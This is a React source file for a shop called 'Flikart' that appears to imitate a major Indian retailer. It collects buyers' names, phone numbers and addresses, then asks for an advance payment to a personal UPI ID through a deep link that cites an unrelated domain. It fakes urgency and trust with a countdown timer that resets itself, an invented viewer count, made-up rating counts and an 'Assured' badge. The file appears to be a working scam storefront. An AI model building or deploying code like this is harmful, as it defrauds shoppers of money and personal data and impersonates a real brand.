import React, { useEffect, useMemo, useState } from "react";
import { createRoot } from "react-dom/client";
import { products } from "./products";
import "./styles.css";

const UPI_ID = "bharatsingh6688@axl";
const STORE_NAME = "Flikart";

function SaleTimer() {
  const [seconds, setSeconds] = useState(600);

  useEffect(() => {
    const id = setInterval(() => {
      setSeconds((s) => (s <= 0 ? 600 : s - 1));
    }, 1000);

    return () => clearInterval(id);
  }, []);

  const mm = String(Math.floor(seconds / 60)).padStart(2, "0");
  const ss = String(seconds % 60).padStart(2, "0");

  return (
    <div className="sale-timer">
      <span>Live Sale :</span> <b>{mm}min {ss}sec</b>
    </div>
  );
}

function Header({ search, setSearch, setPage, cartCount }) {
  return (
    <>
      <header className="mobile-header">
        <div className="brand-tabs">
          <button className="brand-tab active" onClick={() => setPage("home")}>
            <span className="brand-mark">F</span>
            <strong>Flikart</strong>
          </button>

          <button className="brand-tab" onClick={() => setPage("shop")}>
            <span className="travel-mark">✈</span>
            <strong>Travel</strong>
          </button>
        </div>

        <div className="search-box">
          <span>⌕</span>

          <input
            value={search}
            onChange={(e) => setSearch(e.target.value)}
            placeholder="Search for Product"
          />
        </div>
      </header>

      <header className="desktop-header">
        <button className="desktop-logo" onClick={() => setPage("home")}>
          Flikart
        </button>

        <div className="desktop-search">
          <span>⌕</span>

          <input
            value={search}
            onChange={(e) => setSearch(e.target.value)}
            placeholder="Search for Products, Brands and More"
          />
        </div>

        <button className="desktop-cart" onClick={() => setPage("cart")}>
          🛒 Cart {cartCount > 0 ? `(${cartCount})` : ""}
        </button>
      </header>
    </>
  );
}

function Categories({ setPage }) {
  const items = [
    ["🛍️", "For You"],
    ["👕", "Fashion"],
    ["📱", "Mobiles"],
    ["💄", "Beauty"],
    ["💻", "Electronics"],
    ["⌚", "Watches"],
  ];

  return (
    <nav className="categories">
      {items.map(([icon, label], i) => (
        <button
          key={label}
          className={`category ${i === 0 ? "active" : ""}`}
          onClick={() => setPage("shop")}
        >
          <span>{icon}</span>
          <b>{label}</b>
        </button>
      ))}
    </nav>
  );
}

function SaleBanner() {
  return (
    <section className="sale-banner">
      <img src="/hero.png" alt="Mega sale" />

      <div className="banner-fallback">
        <small>MEGA FASHION SALE</small>
        <strong>SALE IS LIVE</strong>
        <span>Premium men's fashion deals</span>
      </div>
    </section>
  );
}

function ProductCard({ product, addToCart, buyNow }) {
  const discount = Math.max(
    0,
    Math.round(((product.mrp - product.price) / product.mrp) * 100)
  );

  const ratings = 3200 + product.id * 827;

  return (
    <article className="product-card">
      <div className="product-image">
        <img src={product.image} alt={product.name} />
      </div>

      <div className="product-info">
        <h3 title={product.name}>{product.name}</h3>

        <div className="discount-row">
          <span>{discount}% Off</span>
          <del>₹{product.mrp}.00</del>
        </div>

        <div className="price-row">
          <strong>₹{product.price}.00</strong>
          <span className="assured">✓ Assured</span>
        </div>

        <div className="rating-row">
          <span className="rating">4.5 ★</span>
          <span>{ratings} Ratings</span>
        </div>

        <p className="delivery">Free Delivery in Two Days</p>

        <div className="product-actions">
          <button
            className="add-btn"
            onClick={() => addToCart(product)}
          >
            ADD
          </button>

          <button
            className="buy-btn"
            onClick={() => buyNow(product)}
          >
            BUY NOW
          </button>
        </div>
      </div>
    </article>
  );
}

function Home({ search, setPage, addToCart, buyNow }) {
  const filtered = useMemo(() => {
    const q = search.trim().toLowerCase();

    if (!q) return products;

    return products.filter((p) =>
      `${p.name} ${p.short}`.toLowerCase().includes(q)
    );
  }, [search]);

  return (
    <main>
      <Categories setPage={setPage} />

      <SaleBanner />

      <section className="live-sale">
        <SaleTimer />

        <div className="watching">
          <span /> 14,352 People watching this sale
        </div>
      </section>

      <section className="products-area">
        <div className="section-heading">
          <h2>Best Deals For You</h2>

          <button onClick={() => setPage("shop")}>
            View All
          </button>
        </div>

        <div className="product-grid">
          {filtered.length ? (
            filtered.map((p) => (
              <ProductCard
                key={p.id}
                product={p}
                addToCart={addToCart}
                buyNow={buyNow}
              />
            ))
          ) : (
            <div className="no-results">
              <h3>No products found</h3>
              <p>Try another search.</p>
            </div>
          )}
        </div>
      </section>
    </main>
  );
}

function Shop({ search, addToCart, buyNow }) {
  const filtered = products.filter((p) =>
    `${p.name} ${p.short}`
      .toLowerCase()
      .includes(search.toLowerCase())
  );

  return (
    <main className="page">
      <div className="page-heading">
        <h2>All Products</h2>
        <span>{filtered.length} items</span>
      </div>

      <div className="product-grid">
        {filtered.map((p) => (
          <ProductCard
            key={p.id}
            product={p}
            addToCart={addToCart}
            buyNow={buyNow}
          />
        ))}
      </div>
    </main>
  );
}

function Cart({ cart, setPage, updateQty, removeItem }) {
  const total = cart.reduce(
    (s, p) => s + p.price * p.qty,
    0
  );

  return (
    <main className="page cart-page">
      <h2>My Cart</h2>

      {!cart.length ? (
        <div className="empty-box">
          <div>🛒</div>

          <h3>Your cart is empty</h3>

          <button onClick={() => setPage("home")}>
            Continue Shopping
          </button>
        </div>
      ) : (
        <>
          <div className="cart-list">
            {cart.map((item) => (
              <div className="cart-item" key={item.id}>
                <img src={item.image} alt={item.name} />

                <div className="cart-item-info">
                  <h3>{item.name}</h3>

                  <p>{item.short}</p>

                  <strong>₹{item.price}</strong>

                  <div className="quantity">
                    <button
                      onClick={() =>
                        updateQty(item.id, -1)
                      }
                    >
                      −
                    </button>

                    <span>{item.qty}</span>

                    <button
                      onClick={() =>
                        updateQty(item.id, 1)
                      }
                    >
                      +
                    </button>
                  </div>

                  <button
                    className="remove-btn"
                    onClick={() =>
                      removeItem(item.id)
                    }
                  >
                    Remove
                  </button>
                </div>
              </div>
            ))}
          </div>

          <div className="cart-total">
            <span>Total Amount</span>
            <strong>₹{total}</strong>
          </div>

          <button
            className="full-action"
            onClick={() => setPage("checkout")}
          >
            PLACE ORDER
          </button>
        </>
      )}
    </main>
  );
}

function Checkout({ cart, setPage, setOrder }) {
  const total = cart.reduce(
    (s, p) => s + p.price * p.qty,
    0
  );

  const first = cart[0];

  const [form, setForm] = useState({
    name: "",
    phone: "",
    address: "",
    pincode: "",
  });

  const [loading, setLoading] = useState(false);

  async function submit(e) {
    e.preventDefault();

    if (
      !form.name ||
      !form.phone ||
      !form.address ||
      !form.pincode
    ) {
      alert("Please fill all details.");
      return;
    }

    setLoading(true);

    try {
      const response = await fetch("/api/create-order", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },

        body: JSON.stringify({
          customer_name: form.name,
          phone: form.phone,
          address: `${form.address}, ${form.pincode}`,
          product_name: first.name,
          quantity: cart.reduce(
            (s, p) => s + p.qty,
            0
          ),
          total_amount: total,
          advance_amount: first.advance,
          cod_amount: first.cod,
          payment_method: "UPI",
          payment_status: "Pending",
          order_status: "Pending",
        }),
      });

      const data = await response.json();

      if (!response.ok) {
        throw new Error(
          data.error || "Order failed"
        );
      }

      const createdOrder = data.order || data;

      setOrder({
        id: createdOrder.id,
        total,
        advance: first.advance,
        customer: form.name,
      });

      setPage("payment");
    } catch (err) {
      alert(err.message);
    } finally {
      setLoading(false);
    }
  }

  return (
    <main className="page checkout-page">
      <div className="form-card">
        <h2>Enter Delivery Details</h2>

        <form onSubmit={submit}>
          <input
            placeholder="Full Name"
            value={form.name}
            onChange={(e) =>
              setForm({
                ...form,
                name: e.target.value,
              })
            }
          />

          <input
            placeholder="Mobile Number"
            inputMode="numeric"
            value={form.phone}
            onChange={(e) =>
              setForm({
                ...form,
                phone: e.target.value,
              })
            }
          />

          <textarea
            placeholder="Full Address"
            value={form.address}
            onChange={(e) =>
              setForm({
                ...form,
                address: e.target.value,
              })
            }
          />

          <input
            placeholder="Pincode"
            inputMode="numeric"
            value={form.pincode}
            onChange={(e) =>
              setForm({
                ...form,
                pincode: e.target.value,
              })
            }
          />

          <div className="checkout-total">
            <span>Total</span>
            <strong>₹{total}</strong>
          </div>

          <button
            className="full-action"
            disabled={loading}
          >
            {loading
              ? "PROCESSING..."
              : "CONTINUE TO PAYMENT"}
          </button>
        </form>
      </div>
    </main>
  );
}

function Payment({ order, setPage }) {
  const [confirmed, setConfirmed] = useState(false);

  useEffect(() => {
    if (!order?.id) return;

    const interval = setInterval(async () => {
      try {
        const response = await fetch(
          `/api/order-status?id=${encodeURIComponent(order.id)}`
        );

        const data = await response.json();

        if (
          data.payment_status === "Confirmed" ||
          data.order_status === "Confirmed"
        ) {
          setConfirmed(true);
          clearInterval(interval);
        }
      } catch {}
    }, 4000);

    return () => clearInterval(interval);
  }, [order]);

  if (confirmed) {
    return (
      <main className="page center-page">
        <div className="success-card">
          <div className="success-icon">✓</div>

          <h1>Order Confirmed!</h1>

          <p>
            Your payment has been verified.
          </p>

          <small>
            Order ID: {order.id}
          </small>

          <button
            className="full-action"
            onClick={() => setPage("track")}
          >
            TRACK ORDER
          </button>
        </div>
      </main>
    );
  }

  /*
    FINAL UPI PAYMENT LINK

    NPCI UPI deep-link parameters:
    pa = UPI ID
    pn = Payee name
    tr = Transaction reference
    tn = Transaction note
    am = Amount
    cu = Currency
    url = Transaction/reference URL
  */

  const transactionRef =
    String(order?.id || "")
      .replace(/[^a-zA-Z0-9]/g, "")
      .slice(0, 35) ||
    `FLK${Date.now()}`;

  const advanceAmount = Number(order?.advance || 0).toFixed(2);

  const transactionNote =
    `Flikart Order ${transactionRef}`.slice(0, 50);

  const upiLink =
    `upi://pay?pa=${encodeURIComponent(UPI_ID)}` +
    `&pn=${encodeURIComponent(STORE_NAME)}` +
    `&tr=${encodeURIComponent(transactionRef)}` +
    `&tn=${encodeURIComponent(transactionNote)}` +
    `&am=${encodeURIComponent(advanceAmount)}` +
    `&cu=INR` +
    `&url=${encodeURIComponent(
      `https://www.rcpay9.online`
    )}`;

  return (
    <main className="page center-page">
      <div className="payment-card">
        <div className="payment-icon">💳</div>

        <h2>Complete Payment</h2>

        <p>
          Pay the advance amount to confirm your order.
        </p>

        <div className="payment-amount">
          ₹{order.advance}
        </div>

        <div className="upi-box">
          <span>UPI ID</span>

          <strong>{UPI_ID}</strong>
        </div>

        <a
          className="pay-button"
          href={upiLink}
        >
          PAY ₹{order.advance} USING UPI
        </a>

        <div className="pending-status">
          <span />
          Waiting for payment verification...
        </div>

        <small>
          Your order remains pending until the payment
          is verified.
        </small>
      </div>
    </main>
  );
}

function Track() {
  const [id, setId] = useState("");
  const [order, setOrder] = useState(null);

  async function track(e) {
    e.preventDefault();

    if (!id.trim()) return;

    try {
      const response = await fetch(
        `/api/order-status?id=${encodeURIComponent(id)}`
      );

      const data = await response.json();

      if (!response.ok) {
        throw new Error(
          data.error || "Order not found"
        );
      }

      setOrder(data);
    } catch (err) {
      alert(err.message);
    }
  }

  return (
    <main className="page center-page">
      <div className="form-card track-card">
        <h2>Track Your Order</h2>

        <p>Enter your Order ID below.</p>

        <form onSubmit={track}>
          <input
            placeholder="Order ID"
            value={id}
            onChange={(e) =>
              setId(e.target.value)
            }
          />

          <button className="full-action">
            TRACK ORDER
          </button>
        </form>

        {order && (
          <div className="track-result">
            <p>
              <b>Order ID:</b> {order.id}
            </p>

            <p>
              <b>Payment:</b>{" "}
              {order.payment_status}
            </p>

            <p>
              <b>Order:</b>{" "}
              {order.order_status}
            </p>
          </div>
        )}
      </div>
    </main>
  );
}

function BottomNav({
  page,
  setPage,
  cartCount,
}) {
  return (
    <nav className="bottom-nav">
      <button
        className={
          page === "home" ? "selected" : ""
        }
        onClick={() => setPage("home")}
      >
        <span>⌂</span>
        Home
      </button>

      <button
        className={
          page === "shop" ? "selected" : ""
        }
        onClick={() => setPage("shop")}
      >
        <span>▦</span>
        Categories
      </button>

      <button
        className={
          page === "track" ? "selected" : ""
        }
        onClick={() => setPage("track")}
      >
        <span>📦</span>
        Orders
      </button>

      <button
        className={
          page === "cart" ? "selected" : ""
        }
        onClick={() => setPage("cart")}
      >
        <span className="cart-icon">
          🛒
          {cartCount > 0 && (
            <i>{cartCount}</i>
          )}
        </span>
        Cart
      </button>
    </nav>
  );
}

function Footer() {
  return (
    <footer className="footer">
      <div>
        <h3>Flikart</h3>

        <p>
          Premium fashion deals at special prices.
        </p>
      </div>

      <div>
        <b>Customer Support</b>

        <span>Track Order</span>
        <span>Payment Help</span>
        <span>Contact Us</span>
      </div>

      <div>
        <b>Shopping</b>

        <span>Fashion</span>
        <span>Accessories</span>
        <span>Best Deals</span>
      </div>
    </footer>
  );
}

function App() {
  const [page, setPage] = useState("home");

  const [search, setSearch] = useState("");

  const [cart, setCart] = useState([]);

  const [order, setOrder] = useState(null);

  function addToCart(product) {
    setCart((current) => {
      const existing = current.find(
        (p) => p.id === product.id
      );

      if (existing) {
        return current.map((p) =>
          p.id === product.id
            ? {
                ...p,
                qty: p.qty + 1,
              }
            : p
        );
      }

      return [
        ...current,
        {
          ...product,
          qty: 1,
        },
      ];
    });
  }

  function buyNow(product) {
    setCart([
      {
        ...product,
        qty: 1,
      },
    ]);

    setPage("checkout");
  }

  function updateQty(id, amount) {
    setCart((current) =>
      current
        .map((p) =>
          p.id === id
            ? {
                ...p,
                qty: p.qty + amount,
              }
            : p
        )
        .filter((p) => p.qty > 0)
    );
  }

  function removeItem(id) {
    setCart((current) =>
      current.filter((p) => p.id !== id)
    );
  }

  const cartCount = cart.reduce(
    (sum, p) => sum + p.qty,
    0
  );

  return (
    <div className="app">
      <Header
        search={search}
        setSearch={setSearch}
        setPage={setPage}
        cartCount={cartCount}
      />

      {page === "home" && (
        <Home
          search={search}
          setPage={setPage}
          addToCart={addToCart}
          buyNow={buyNow}
        />
      )}

      {page === "shop" && (
        <Shop
          search={search}
          addToCart={addToCart}
          buyNow={buyNow}
        />
      )}

      {page === "cart" && (
        <Cart
          cart={cart}
          setPage={setPage}
          updateQty={updateQty}
          removeItem={removeItem}
        />
      )}

      {page === "checkout" && (
        <Checkout
          cart={cart}
          setPage={setPage}
          setOrder={setOrder}
        />
      )}

      {page === "payment" && (
        <Payment
          order={order}
          setPage={setPage}
        />
      )}

      {page === "track" && <Track />}

      <Footer />

      <BottomNav
        page={page}
        setPage={setPage}
        cartCount={cartCount}
      />
    </div>
  );
}

createRoot(
  document.getElementById("root")
).render(<App />);
